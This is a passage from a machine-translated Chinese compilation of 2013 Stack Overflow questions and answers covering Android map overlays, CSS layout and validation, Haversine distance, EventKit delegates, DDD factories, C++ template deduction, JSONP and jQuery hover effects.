01-01 20:51:35.097: I/System.out(690): ItemizedOverlayForNearbyLocation createItem() 7
01-01 20:51:35.108: I/System.out(690): ItemizedOverlayForNearbyLocation createItem() 8
01-01 20:51:35.126: I/System.out(690): ItemizedOverlayForNearbyLocation createItem() 9
01-01 20:51:35.146: I/System.out(690): ItemizedOverlayForNearbyLocation createItem() 10
01-01 20:51:35.168: I/System.out(690): ItemizedOverlayForNearbyLocation createItem() 11
01-01 20:51:35.186: I/System.out(690): ItemizedOverlayForNearbyLocation createItem() 12
01-01 20:51:35.196: I/System.out(690): ItemizedOverlayForNearbyLocation createItem() 13
01-01 20:51:35.216: I/System.out(690): addOverlay is called
01-01 20:51:35.216: I/System.out(690): ItemizedOverlayForNearbyLocation createItem() 0
01-01 20:51:35.228: I/System.out(690): ItemizedOverlayForNearbyLocation createItem() 1
01-01 20:51:35.250: I/System.out(690): ItemizedOverlayForNearbyLocation createItem() 2
01-01 20:51:35.256: I/System.out(690): ItemizedOverlayForNearbyLocation createItem() 3
01-01 20:51:35.267: I/System.out(690): ItemizedOverlayForNearbyLocation createItem() 4
01-01 20:51:35.286: I/System.out(690): ItemizedOverlayForNearbyLocation createItem() 5
01-01 20:51:35.296: I/System.out(690): ItemizedOverlayForNearbyLocation createItem() 6
01-01 20:51:35.306: I/System.out(690): ItemizedOverlayForNearbyLocation createItem() 7
01-01 20:51:35.326: I/System.out(690): ItemizedOverlayForNearbyLocation createItem() 8
01-01 20:51:35.336: I/System.out(690): ItemizedOverlayForNearbyLocation createItem() 9
01-01 20:51:35.356: I/System.out(690): ItemizedOverlayForNearbyLocation createItem() 10
01-01 20:51:35.366: I/System.out(690): ItemizedOverlayForNearbyLocation createItem() 11
01-01 20:51:35.376: I/System.out(690): ItemizedOverlayForNearbyLocation createItem() 12
01-01 20:51:35.396: I/System.out(690): ItemizedOverlayForNearbyLocation createItem() 13
01-01 20:51:35.406: I/System.out(690): ItemizedOverlayForNearbyLocation createItem() 14
01-01 20:51:35.426: I/System.out(690): addOverlay is called
01-01 20:51:35.426: I/System.out(690): ItemizedOverlayForNearbyLocation createItem() 0
01-01 20:51:35.438: I/System.out(690): ItemizedOverlayForNearbyLocation createItem() 1
01-01 20:51:35.456: I/System.out(690): ItemizedOverlayForNearbyLocation createItem() 2
01-01 20:51:35.476: I/System.out(690): ItemizedOverlayForNearbyLocation createItem() 3
01-01 20:51:35.486: I/System.out(690): ItemizedOverlayForNearbyLocation createItem() 4
01-01 20:51:35.506: I/System.out(690): ItemizedOverlayForNearbyLocation createItem() 5
01-01 20:51:35.516: I/System.out(690): ItemizedOverlayForNearbyLocation createItem() 6
01-01 20:51:35.526: I/System.out(690): ItemizedOverlayForNearbyLocation createItem() 7
01-01 20:51:35.536: I/System.out(690): ItemizedOverlayForNearbyLocation createItem() 8
01-01 20:51:35.557: I/System.out(690): ItemizedOverlayForNearbyLocation createItem() 9
01-01 20:51:35.566: I/System.out(690): ItemizedOverlayForNearbyLocation createItem() 10
01-01 20:51:35.576: I/System.out(690): ItemizedOverlayForNearbyLocation createItem() 11
01-01 20:51:35.596: I/System.out(690): ItemizedOverlayForNearbyLocation createItem() 12
01-01 20:51:35.608: I/System.out(690): ItemizedOverlayForNearbyLocation createItem() 13
01-01 20:51:35.616: I/System.out(690): ItemizedOverlayForNearbyLocation createItem() 14
01-01 20:51:35.637: I/System.out(690): ItemizedOverlayForNearbyLocation createItem() 15
01-01 20:51:35.666: I/System.out(690): addOverlay is called
01-01 20:51:35.666: I/System.out(690): ItemizedOverlayForNearbyLocation createItem() 0
01-01 20:51:35.686: I/System.out(690): ItemizedOverlayForNearbyLocation createItem() 1
01-01 20:51:35.696: I/System.out(690): ItemizedOverlayForNearbyLocation createItem() 2
01-01 20:51:35.716: I/System.out(690): ItemizedOverlayForNearbyLocation createItem() 3
01-01 20:51:35.726: I/System.out(690): ItemizedOverlayForNearbyLocation createItem() 4
01-01 20:51:35.736: I/System.out(690): ItemizedOverlayForNearbyLocation createItem() 5
01-01 20:51:35.746: I/System.out(690): ItemizedOverlayForNearbyLocation createItem() 6
01-01 20:51:35.756: I/System.out(690): ItemizedOverlayForNearbyLocation createItem() 7
01-01 20:51:35.776: I/System.out(690): ItemizedOverlayForNearbyLocation createItem() 8
01-01 20:51:35.806: I/System.out(690): ItemizedOverlayForNearbyLocation createItem() 9
01-01 20:51:35.816: I/System.out(690): ItemizedOverlayForNearbyLocation createItem() 10
01-01 20:51:35.826: I/System.out(690): ItemizedOverlayForNearbyLocation createItem() 11
01-01 20:51:35.836: I/System.out(690): ItemizedOverlayForNearbyLocation createItem() 12
01-01 20:51:35.846: I/System.out(690): ItemizedOverlayForNearbyLocation createItem() 13
01-01 20:51:35.876: I/System.out(690): ItemizedOverlayForNearbyLocation createItem() 14
01-01 20:51:35.886: I/System.out(690): ItemizedOverlayForNearbyLocation createItem() 15
01-01 20:51:35.896: I/System.out(690): ItemizedOverlayForNearbyLocation createItem() 16
01-01 20:51:35.916: I/System.out(690): addOverlay is called
01-01 20:51:35.916: I/System.out(690): ItemizedOverlayForNearbyLocation createItem() 0
01-01 20:51:35.928: I/System.out(690): ItemizedOverlayForNearbyLocation createItem() 1
01-01 20:51:35.936: I/System.out(690): ItemizedOverlayForNearbyLocation createItem() 2
01-01 20:51:35.946: I/System.out(690): ItemizedOverlayForNearbyLocation createItem() 3
01-01 20:51:35.966: I/System.out(690): ItemizedOverlayForNearbyLocation createItem() 4
01-01 20:51:35.976: I/System.out(690): ItemizedOverlayForNearbyLocation createItem() 5
01-01 20:51:35.986: I/System.out(690): ItemizedOverlayForNearbyLocation createItem() 6
01-01 20:51:35.998: I/System.out(690): ItemizedOverlayForNearbyLocation createItem() 7
01-01 20:51:36.016: I/System.out(690): ItemizedOverlayForNearbyLocation createItem() 8
01-01 20:51:36.026: I/System.out(690): ItemizedOverlayForNearbyLocation createItem() 9
01-01 20:51:36.036: I/System.out(690): ItemizedOverlayForNearbyLocation createItem() 10
01-01 20:51:36.056: I/System.out(690): ItemizedOverlayForNearbyLocation createItem() 11
01-01 20:51:36.077: I/System.out(690): ItemizedOverlayForNearbyLocation createItem() 12
01-01 20:51:36.086: I/System.out(690): ItemizedOverlayForNearbyLocation createItem() 13
01-01 20:51:36.096: I/System.out(690): ItemizedOverlayForNearbyLocation createItem() 14
01-01 20:51:36.106: I/System.out(690): ItemizedOverlayForNearbyLocation createItem() 15
01-01 20:51:36.126: I/System.out(690): ItemizedOverlayForNearbyLocation createItem() 16
01-01 20:51:36.138: I/System.out(690): ItemizedOverlayForNearbyLocation createItem() 17 
```

我不明白为什么它会多次调用，而它们中的每一个都应该只创建一次。因为这意味着我为单个项目占用了更多内存。

任何人对 ItemizedOvelray 类有任何想法或更好的理解。请帮助我。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-01T15:37:57.963

这就是`populateItems`工作的方式。[使用Polaris](https://github.com/cyrilmottier/Polaris)会更好，它使用起来更简单，功能更强大。

# facebook-graph-api - facebook-graph API中照片标记段的宽度和高度

> ID：14111725
> 
> 赞同：3
> 
> 时间：2013-01-01T15:35:47.980
> 
> 标签：facebook-graph-api

我正在尝试提取我朋友的 facebook 照片的标记片段来训练面部识别算法。虽然[https://developers.facebook.com/docs/reference/api/photo/](https://developers.facebook.com/docs/reference/api/photo/)描述了照片中标签的 x 和 y 位置，但我不知道如何检索出现时出现的矩形的宽度和高度您将鼠标悬停在 Facebook 照片中的一张脸上。是否可以找出照片中标记的脸的宽度和高度？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2016-08-06T11:39:18.360

我也面临同样的情况。我所做的是在 python 和 opencv2 中编写一个快速脚本，用于使用 HAAR Cascades 检测人脸。这为我们提供了围绕检测到的人脸的矩形。由于标签的 x 和 y 参数代表标签的中心，我们寻找围绕标签位置的 face-rectangle。如果多个这样的矩形重叠，我们可以选择中心最接近标签位置的那个。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-05T18:54:19.277

据我所知，通过 Facebook API 无法获取标签框的高度和宽度。

# css - CSS/XHTML 和静态网页？

> ID：14111731
> 
> 赞同：0
> 
> 时间：2013-01-01T15:36:55.437
> 
> 标签：css, xhtml, static

我试图让这个网页看起来更静态。
在较小的分辨率上，文本将无法正确放入 div 元素中。
该网站在这里： http: [//www.vidimortem.info/](http://www.vidimortem.info/)
这是我的 CSS：

```
body {
   width: auto;
   background-color: #FFFFFF;
}
div  {
   border-radius: 0px 5px 5px 5px;
}

/* class identifiers */
.alignmentDiv {
   width: inherit;
   font-family: sans-serif;
   text-align: center;
   color: #000000;
 }

.headerDiv {
   background-color: #318B7C; 
   width: inherit;
   height: 40px;
   margin: auto auto; 
   border-radius: 15px; /* i'm currently hating how css3 hasn't fully been implemented to all themes so it doesn't colorize. */ 
   opacity: 0.8;
}
.sidebarDiv   {
   background-color: #748B31; 
   width: 40%;
   height: 220px; 
   padding: 1% 1% 1% 1%;
   display: inline-block;
   box-shadow: 3px 3px 3px 3px #ccc;
}
.linksDiv {
   background-color: #ACACAC; 
   width: 40%;
   height: 200px; 
   padding: 1% 1% 1% 1%;
   font-size: 14px;
   display: block;
   float: right;
   text-align: justify;
   box-shadow: 3px 3px 3px 3px #ccc;
}
.aboutDiv     {
   background-color: #468B31;
   box-shadow: 3px 3px 3px 3px #ccc;
   width: 50%; 
   height: 130px;
   padding: 1% 1% 1% 1%;
   margin: auto auto;
   margin-top: 3%;
   font-size: 11px;
   display: block; 
   text-align: justify;
}

a {
   color: #F92672;
   text-decoration: none;
   font-weight: bold;
}
a:hover {
   color: #FC689D;
   text-decoration: underline;
} 
```

我想让它尽可能地静态，**而不会**大幅改变外观。HTML 可以在这里找到：[http](http://pastebin.com/raw.php?i=L0xBLau2)
://pastebin.com/raw.php?i= L0xBLau2 提前致谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-01T16:46:26.300

### 以这种方式更改 CSS：

```
body {
   width: 1070px;
   margin: auto;
   background-color: #FFFFFF;
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-01T16:47:58.497

只需删除盒子的高度。

# css - 什么是解析错误，我该如何解决

> ID：14111733
> 
> 赞同：6
> 
> 时间：2013-01-01T15:37:16.507
> 
> 标签：css, validation

我的网站有问题，www.jeremyspence.net78.net 应该有五个不同的颜色空间，只有三个，所以我尝试使用 css 验证器，它说部分有解析错误我遇到问题的css，但我不明白它有什么问题以及为什么它在这里不起作用是验证器[http://jigsaw.w3.org/css-validator/validator?uri=www。 jeremyspence.net78.net&profile=css3&usermedium=all&warning=1&vextwarning=&lang=en](http://jigsaw.w3.org/css-validator/validator?uri=www.jeremyspence.net78.net&profile=css3&usermedium=all&warning=1&vextwarning=&lang=en)这是css

```
#mecontainer {
    width: 100%;
    height: 1080px;
    padding-top:50px;
    background: #cecefe;
}
#supportcontainer {
    width: 100%;
    height: 1080px;
    padding-top:50px;
    background: #fecefe;
} 
```

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2013-01-01T16:14:12.650

你有某种不可见的字符，验证器在某处窒息（即，它看起来和行为像一个空间，但它不是空间）。如果我直接查看您的 CSS 文件并将内容复制/粘贴到 CSS 验证器的直接输入验证中，它就会验证。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2013-01-01T17:43:22.007

[http://www.jeremyspence.net78.net/css/general.css](http://www.jeremyspence.net78.net/css/general.css)中的问题字符可以使用 Rex Swain 的[HTTP 查看器](http://www.rexswain.com/httpview.html)使用显示格式选项“Hex”进行分析。然后可以看出它们是十六进制 A0。字符编码似乎没有在任何地方声明，因此浏览器（和验证器）必须猜测。如果隐含 UTF-8，则 A0 是字符级别的数据错误。如果隐含了 ISO-8859-1 或 windows-1252，它代表 NO-BREAK SPACE，这在 CSS 中是不允许的。

问题的根源可能是某些创作程序已将普通 SPACE 转换为 NO-BREAK SPACE。它看起来像一个空格，走路像一个空格，嘎嘎声像一个空格，但在 CSS 解析中它仍然不是空格。因此，您需要编辑 CSS 文件并用简单的空格替换有问题的缩进。

# php - 从已知位置查找最近的列出（数组？）城市

> ID：14111734
> 
> 赞同：0
> 
> 时间：2013-01-01T15:37:18.103
> 
> 标签：php, javascript, jquery, google-maps, google-maps-api-3

我希望将 HTML5 地理定位功能集成到网站中。我遇到的问题是在所选列表中获取最近的城市/城镇。该站点仅在一定数量的城镇和引用中受支持/营销，因此其想法是浏览器找到他们的位置并选择他们最近的城镇或城市。听起来很简单，但它是我可以理解的“找到最近的”。

我找到了一个线程，它帮助我完成了从浏览器获取 long/lat 并将其转换为城镇/城市名称的过程，但这无助于找到最近列出的名称：[Reverse Geocoding With Google Map API And PHP使用纬度，经度坐标获取最近的位置](https://stackoverflow.com/questions/2054635/reverse-geocoding-with-google-map-api-and-php-to-get-nearest-location-using-lat)

是否有任何 API（最好在 Google 中）可以找到最近的列出位置？我看了看，找不到任何一种。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-01-01T18:51:11.877

[**您可以使用Haversine**](http://rosettacode.org/wiki/Haversine_formula)公式找到最近的城市。以下函数用于计算地理坐标与数组坐标之间的距离

```
function deg2rad(degrees){
radians = degrees * (Math.PI/180);
return radians;
}

function Haversine(lat1,lon1,lat2,lon2) {
  deltaLat = lat2 - lat1 ;
  deltaLon = lon2 - lon1 ;
  earthRadius = 3959; // in miles 6371 in meters.
  alpha    = deltaLat/2;
  beta     = deltaLon/2;
  a        = Math.sin(deg2rad(alpha)) * Math.sin(deg2rad(alpha)) + Math.cos(deg2rad(lat1)) * Math.cos(deg2rad(lat2)) * Math.sin(deg2rad(beta)) * Math.sin(deg2rad(beta)) ;
  c        = 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1-a));
  distance =  earthRadius * c;
  return distance.toFixed(2);
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-01T17:12:48.453

我认为最简单的解决方案是将每个城镇的经纬度坐标存储在数据库中，然后围绕用户位置进行基于半径的搜索并产生最接近的结果。

看看这个问题的公认答案。

[使用 php mysql 按半径搜索经纬度数据库](https://stackoverflow.com/questions/10621345/search-database-with-lat-and-long-by-radius-using-php-mysql)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-01-01T15:52:30.250

[最简单的方法是使用半正弦公式](http://rosettacode.org/wiki/Haversine_formula)或[球面几何库的 computeDistanceBetween 方法](https://developers.google.com/maps/documentation/javascript/geometry#Distance)计算从用户位置到所有城市的“乌鸦飞翔”距离，然后选择最小的那个。

如果您的位置少于 100 个，则可以使用[距离矩阵](https://developers.google.com/maps/documentation/javascript/distancematrix)来确定最短的行驶距离，然后选择结果最短的城镇。

# objective-c - 当从框架呈现模态视图时如何检测何时按下“完成”按钮

> ID：14111740
> 
> 赞同：1
> 
> 时间：2013-01-01T15:37:57.863
> 
> 标签：objective-c, ios, cocoa-touch, if-statement

如果从框架（在我的情况下为 eventkit）呈现模态视图，那么检测取消或完成按钮是否被按下的正确方法是什么。在我的`didCompleteWithaction`模态视图被关闭的示例中，警报视图被触发。`Done`我希望仅在按下按钮而不是取消按钮时才触发警报视图。

我最初的想法`if`是按下完成按钮时的声明，但是我不确定如何获得完成按钮的属性。

```
- (void)eventEditViewController:(EKEventEditViewController *)controller
      didCompleteWithAction:(EKEventEditViewAction)action {

// Dismiss the modal view controller
[controller dismissModalViewControllerAnimated:YES];

UIAlertView *alert = [[UIAlertView alloc] initWithTitle:@"message" message:@"Added to calender" delegate:nil cancelButtonTitle: @"Ok" otherButtonTitles: nil];

[alert show];

} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-01T15:44:23.237

查看委托的协议参考：[苹果文档](http://developer.apple.com/library/ios/ipad/#documentation/EventKitUI/Reference/EKEventEditViewDelegateRef/Reference/Reference.html)

您必须检查`action`委托方法的参数，因为它代表用户选择的操作。

例如

```
- (void)eventEditViewController:(EKEventEditViewController *)controller
      didCompleteWithAction:(EKEventEditViewAction)action {

// Dismiss the modal view controller
[controller dismissModalViewControllerAnimated:YES];

//this checks what action the user chose:
if (action == EKEventEditViewActionSaved) {
     UIAlertView *alert = [[UIAlertView alloc] initWithTitle:@"message" message:@"Added to calender" delegate:nil cancelButtonTitle: @"Ok" otherButtonTitles: nil];

     [alert show];
     }

} 
```

我不知道“完成”按钮会触发什么动作，可能是 ...ActionSaved - 但请自己检查一下。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-01T15:45:32.520

我可能很遥远，但[`action`参数](http://developer.apple.com/library/ios/#documentation/EventKitUI/Reference/EKEventEditViewDelegateRef/Reference/Reference.html#//apple_ref/doc/c_ref/EKEventEditViewAction)不是你想要的吗？

> ### EKEventEditViewAction
> 
> 描述用户为结束编辑所采取的操作。

```
typedef enum {
   EKEventEditViewActionCanceled,
   EKEventEditViewActionSaved,
   EKEventEditViewActionDeleted
} EKEventEditViewAction; 
```

我想`EKEventEditViewActionSaved`应该对应于完成按钮。

# c# - 将 DTO 接口传递到域工厂？

> ID：14111741
> 
> 赞同：3
> 
> 时间：2013-01-01T15:38:00.110
> 
> 标签：c#, domain-driven-design, dto

我正在尝试在我当前的项目中应用 DDD 的原理。我将尝试用一个希望有意义的例子来问这个（冗长的）问题。

创建新成员时，我的表示层调用在应用层中定义的 MemberService.CreateMember(MemberDTO memberDTO)。

我的表示层有这样的东西：

```
MemberDTO member = new MemberDTO(); //Defined in Application Layer

member.Username = username;
member.Password = password;
//...etc 
```

我的应用程序层在域层中调用以下工厂方法来创建成员：

```
public static Member MemberFactory.CreateMember(string memberDTO.Username, string memberDTO.Password...)
{
  var member = new Member(); //Domain.Model.Member

  member.Id = GenerateIdentity();

  member.Username = memberDTO.Username;

  //... etc

  return member;
} 
```

成员被传递回 MemberService（应用程序层），后者保存它（基础设施层中的存储库）并将其映射到 MemberDTO（使用 AutoMapper）并将其传递回表示层。

因此，我的表示层在 MemberDTO 中设置值，然后我的域层（通过工厂）获取单个参数并为成员设置值。如果没有工厂，它会很简单，但我在这里生成 Id。创建域服务而不是生成 Id 会不会是错误的？例如，将 MemberService.CreateMember(MemberDTO memberDTO) 方法从：

```
public MemberDTO CreateMember(MemberDTO memberDTO)
{
   var member = MemberFactory.CreateMember(memberDTO.Username, memberDTO.Password); 
   //Domain.Model.Member

   SaveMember(member);

   //Pass DTO to presentation layer
   return Mapper.Map<Member, MemberDTO>(member);
} 
```

对此：

```
public MemberDTO CreateMember(MemberDTO memberDTO)
{
   var member = new Member(); //Domain.Model.Member

   Mapper.Map<MemberDTO, Member>(memberDTO);

   //Add this method into a Domain Service to generate the ID and any other defaults
   Domain.MemberService.Initialise(member);

   SaveMember(member);

   //Pass DTO to presentation layer
   return Mapper.Map<Member, MemberDTO>(member);
} 
```

很抱歉这个冗长的问题，即使答案可能是简单的是或否！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-02T15:04:39.647

关于 DDD，如果此身份不是域身份（即基于有界上下文定义用户的内容），那么它不属于您的域模型。在我见过的大多数情况下，用户名是有界上下文中用户的身份，并且任何生成的 ID 都是为了访问数据库而完成的。我怀疑这可能是您的情况，如果我是对的，那么生成的 ID 是基础架构问题，应该由您的存储库实现来完成。您的域不应该有这个生成的 ID 的任何概念。

另一方面，假设用户名是您上下文中用户的身份，并且您希望使用某些域公式生成该身份。在这种情况下，生成身份将是一种域服务方法，因为它实际上并不属于任何域对象的实例。然后生成的 ID 将被传递到您的工厂，您将拥有：

```
public MemberDTO CreateMember(MemberDTO memberDTO)
{
   //Domain.Model.Member
   var member = MemberFactory.CreateMember(MemberService.GenerateUserName(), memberDTO.Password); 

   SaveMember(member); //Repository method?

   //Pass DTO to presentation layer
   return Mapper.Map<Member, MemberDTO>(member);
} 
```

总而言之，答案是否定的，假设 ID 是有界上下文的实际身份，创建域服务来生成 ID 并**没有错。**事实上，这是你应该做的。但是，如果 ID 不是有界上下文的用户身份，那么让您的存储库担心如何生成 ID、访问数据库以及与域模型之间进行转换。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-02T22:53:37.497

简短的回答：是的，您可以将 DTO 对象传递给工厂。

长答案：域对象工厂负责创建完全初始化的域对象。但是，只要您能提供所需的信息，您就可以自由选择任何形式的输入。在这种情况下，在您的工厂中使用任一方法是个人选择的问题： - public Member CreateMember(string userName, string password, ...) {...} - public Member CreateMember(MemberDTO memberDTO) {.. .}

从分层的角度来看，域对象工厂是域模型的一部分。因此，它可以被领域模型层和应用层中的不同对象使用和依赖。根据您的描述， MemberService 似乎属于您的应用程序（服务）层。如果将创建逻辑移入其中，您可能会发现困难的依赖问题。例如，如果一个 Booking 域对象在确认时创建了一个 Member 域对象，那么您最终可能会使 Booking 对象依赖于 MemberService，这不是一个好主意。示例如下所示：http: [//thinkinginobjects.com/2012/09/05/abstract-factory-in-domain-modelling](http://thinkinginobjects.com/2012/09/05/abstract-factory-in-domain-modelling)

如果我们退后一步，从某个角度看问题，我想问一下 MemberDTO 和 MemberService 究竟为您的应用程序提供什么服务。DTO 对象是否用作一组数据字段的包装器？MemberService 是否只是将 create 调用委托给您的工厂和存储库？如果答案是肯定的，那么如果我们一起摆脱 MemberDTO 和 MemberService 并让演示文稿直接调用 MemberFactory 和 MemberRepository，代码会简单得多。我在这里做了很多假设，但是如果您的表示层和服务层在物理上是分开的，您可能会发现 DTO 和服务仍然是可取的。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-01-01T18:00:31.587

我不确定这个问题与 DDD 的关系，因为我没有看到需要额外复杂性的复杂域。但是，可能有一个论点是在另一个结构中定义身份的生成，但这主要是为了实现单一职责（SRP）。

我建议您创建一个名为`IGenerateMemberIdentity`. 然后，您可以隔离该复杂性并对其进行测试。我认为您认为此功能不属于工厂的直觉是正确的。如果这是一个复杂的例程，它似乎与对象创建无关。

然而，对我来说，`Initialize`静态方法似乎是一种代码味道。最好在提供该功能的接口后面注入依赖项。

专门回答你的问题。不，我不认为这是错误的。事实上，为了保留纯业务功能而对复杂性进行建模是 DDD 最擅长的。

# java - SOAP Web 服务 API 密钥

> ID：14111743
> 
> 赞同：0
> 
> 时间：2013-01-01T15:38:10.030
> 
> 标签：java, web-services, soap, java-metro-framework, api-key

我目前正在从事一个与 java 中的梦幻足球相关的项目，并希望通过基于 SOAP 的 Web 服务公开功能。我注意到一些现有的公司在您注册时共享他们的网络服务以及 API 密钥。如果客户端希望使用该服务，他们需要传入该方法所需的任何参数以及强制性 API 密钥。我想介绍一个类似的功能，也想知道是否有任何好的 Java 库可以用来为希望使用 Web 服务的每个注册用户生成 API 密钥。感谢您是否可以分享任何现有的教程以及答案。提前致谢。

我目前的技术栈：Netbeans - ide、GlassFish、JSF、Metro 和 MySQL

示例参考： [http ://www.xmlsoccer.com/FootballData.asmx/GetLiveScore?ApiKey=YourAPIKey](http://www.xmlsoccer.com/FootballData.asmx/GetLiveScore?ApiKey=YourAPIKey)

上述示例的 WSDL：www.xmlsoccer.com/FootballData.asmx?WSDL

文档：www.xmlsoccer.com/xmlsoccer.pdf

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-01T22:01:58.157

目前尚不完全清楚您的具体问题是什么。您问“......是否有任何好的 Java 库可用于为每个注册用户生成 API 密钥”——生成 API 密钥并没有什么特别之处，它们通常只是随机字符串。如果您正在寻找一个完整的解决方案（包括供开发人员注册和获取 API 密钥的基于 Web 的界面），有一些可用的托管解决方案，例如[http://blog.programmableweb.com/2011/10/ 19/api-service-provider-roundup/](http://blog.programmableweb.com/2011/10/19/api-service-provider-roundup/)。一般来说，我认为您会发现很少有与 SOAP 和公共 API 开发人员密钥相关的资源，因为现在创建的大多数*公共*开发人员 API 往往是 REST，而 SOAP 主要用于“封闭”企业场景。

# c++ - 从 GCC 获得“无匹配功能”

> ID：14111744
> 
> 赞同：4
> 
> 时间：2013-01-01T15:38:16.440
> 
> 标签：c++, templates

为什么这个简单的代码不起作用？

```
template<class U>
class retype 
{ 
    typedef U type; 
};

class object
{
public:
    template<class U>
    int create(typename retype<U>::type p)
    {
        return 4;
    }
};

int main()
{
    int n = object().create(5);

    return 0;
} 
```

使用 GCC 编译时出现此错误：

```
test.cpp: In function ‘int main()’:
test.cpp:20: error: no matching function for call to ‘object::create(int)’ 
```

问题出在哪里？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-01-01T15:44:09.763

您依赖于从函数参数中推导模板参数。但是函数模板参数不能被推导，因为那是一个不可推导的上下文。

更具体地说，即使是`U`也无法推导出模板参数。因为可能有一个专门的定义为：`retype<U>::type``int``retype`

```
template<>
struct retype<X>
{
      typedef int type;
}; 
```

所以你看，给定`retype<U>::type`is `int`，模板参数`U`也可以`X`。

事实上，可能有不止一种这样的专业化，所有这些专业化都可以定义`type`为`int`. 所以没有一对一的关系。编译器不能*唯一地*推断出`U`.

# javascript - Json + javascript 意外令牌：

> ID：14111747
> 
> 赞同：-1
> 
> 时间：2013-01-01T15:38:52.967
> 
> 标签：javascript, json

```
var dat;

$.ajax({
    url: url,
    type: 'POST',
    dataType: "json",
    success: function (data, textStatus) {
        dat = data;
        alert(data.name);
    }
}); 
```

我正在尝试从 URL 获取 JSON 编码的数据。这是 AJAX 从服务器收到的响应：http: [//pastebin.com/53e6CgbK](http://pastebin.com/53e6CgbK)。但是，网络浏览器给我一个错误：

```
Uncaught SyntaxError: Unexpected token : 
```

如何从 JSON 编码数据中获取属性？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-01T16:15:49.470

您正在发出需要返回 JSONP 的跨域请求。许多 API 不返回 JSONP，而您提供的示例 url 不返回。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-01T15:53:09.460

在 $.ajax 调用之前，您的代码中很可能存在语法错误，例如缺少 '}'，这会导致 javascript 引擎与您的意图不同步并出现意外的“:”。

# css - 如果同一元素的多个类定义了一个 :before 伪元素会怎样？

> ID：14111751
> 
> 赞同：6
> 
> 时间：2013-01-01T15:39:30.780
> 
> 标签：css, css-selectors, pseudo-element

我使用`:before`符号来标记指向用户配置文件的链接来表征用户，示例包括“管理员”、“非活动用户”、“新手”等。

问题是，有可能不止一个人申请。

那么如果链接上的多个类用 定义了一个`:before`伪元素会发生`content`什么？最具体的选择器会覆盖第一个吗？还是它们都按顺序出现？不管发生什么，这是可靠的行为吗？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-01-01T16:03:49.280

最具体的选择器优先。这在[CSS2.1](http://www.w3.org/TR/CSS21/selector.html#pseudo-element-selectors)中提到：

> 除了下面和其他地方描述的例外，伪元素的行为就像 CSS 中的真实元素[一样。](http://www.w3.org/TR/CSS21/generate.html#before-after-content)

就实际浏览器行为而言，据我所知，这种行为在所有支持的浏览器`:before`和`:after`非替换元素（如`a`）上都是可靠的，CSS2.1 确实为这些伪元素定义了行为，与替换元素（如`img`. 这是有道理的，因为如果要生成多个这样的伪元素，浏览器将不知道它应该如何在格式化结构中布置它们。

在下面的示例中，通过特异性和级联，`a.inactive:before`将优先，并且`:before`此链接的伪元素将具有匹配的内容（因为两个选择器同样具体——具有类型选择器、类选择器和伪元素）：

```
a.administrator:before {
    content: '[Administrator] ';
}

a.inactive:before {
    content: '[Inactive User] ';
}
```

```
<a class="administrator inactive" href="profile.php?userid=123">Username</a>
```

如果一个元素可以匹配多个具有相同伪元素的选择器，并且您希望所有这些都以某种方式应用，则需要使用组合选择器创建额外的 CSS 规则，以便您可以准确指定浏览器在这些选择器中应该做什么案例。扩展上面的例子：

```
a.administrator:before {
    content: '[Administrator] ';
}

a.inactive:before {
    content: '[Inactive User] ';
}

a.administrator.inactive:before {
    content: '[Administrator] [Inactive User] ';
}
```

```
<a class="administrator inactive" href="profile.php?userid=123">Username</a>
```

# javascript - 根据我悬停的按钮移动相同的图像

> ID：14111753
> 
> 赞同：0
> 
> 时间：2013-01-01T15:39:34.747
> 
> 标签：javascript, jquery, html, css

我在页面上有 8 个按钮（图像），都在同一行。还有一张没有文字的隐藏图像（红色矩形框）。我想在按钮（图像）下方显示相同的红色框，我将鼠标悬停在图像上的动态文本上（这将根据按钮的链接）

HTML 代码：

```
 <div id="imageRings">
    <img id="ringOne" class="rotate" src="images/ring1.png">
    <img id="ringTwo" class="rotate" src="images/ring2.png">
    <img id="ringThree" class="rotate" src="images/ring3.png">
    <img id="ringFour" class="rotate" src="images/ring4.png">
    <img id="ringFive" class="rotate" src="images/ring5.png">
    <img id="ringSix" class="rotate" src="images/ring6.png">
    <img id="ringSeven" class="rotate" src="images/ring7.png">
    <img id="ringEight" class="rotate" src="images/ring8.png">
    </div> 
```

所以这些是当我悬停时我希望图像出现在我悬停在相应图像下方的图像，以及取决于链接的文本（我的意思是我应该能够修改显示在矩形框中的文本）

我知道我一开始并没有给出太多代码，但我不知道还能提供什么。上面的代码中我缺少的是矩形框图像的代码，但我没有在任何地方写它，因为位置是需要根据悬停来确定和改变的。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-01T16:11:23.913

将您的图像放在分区和/或列表中，如下所示

```
<div id="hover">
<div class="ima 1">
<img src="your_img_1" />
<div class="fill">
</div></div>
<div class="ima 3">
<img src="your_img_2" />
<div class="fill">
</div></div>
<div class="ima 2">
<img src="your_img_3" />
<div class="fill">
</div>
</div></div> 
```

定位为

```
.ima{
float:left /*Float to make parallel*/
}

img{
display:block;
} 
```

查询：

```
$('.ima img').hover(function(){
$(this).parent().find('.fill').html('<img src="image" />');
},
function(){
$(this).parent().find('.fill').html('  ');
}
); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-01T16:01:42.147

尝试这个; 将您的图像放在 inline`<li>`中，然后您可以在悬停时将该 .rect div 附加到每个图像。这也是一个[jsFiddle](http://jsfiddle.net/psyon001/f7tsd/)示例。

**HTML**

```
